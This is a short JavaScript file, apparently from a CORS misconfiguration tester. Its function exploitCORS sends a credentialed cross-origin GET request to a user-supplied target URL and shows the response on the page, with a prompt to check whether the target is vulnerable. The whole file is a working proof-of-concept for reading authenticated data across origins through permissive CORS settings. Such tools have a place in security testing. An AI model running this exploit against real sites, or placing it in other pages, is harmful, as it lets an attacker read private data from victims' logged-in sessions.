function exploitCORS() {
    var targetUrl = document.getElementById("targetURL").value;

    if (!targetUrl) {
        alert("Please enter a valid target URL!");
        return;
    }

    // Clear the previous response
    document.getElementById("fetchedResource").value = "";

    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('GET', targetUrl, true); 
    req.withCredentials = true; 
    req.send();
}

function reqListener() {
    document.getElementById("fetchedResource").value = this.responseText;

    if (!this.responseText) {
        alert("No response received. Check if the target is vulnerable.");
    }
}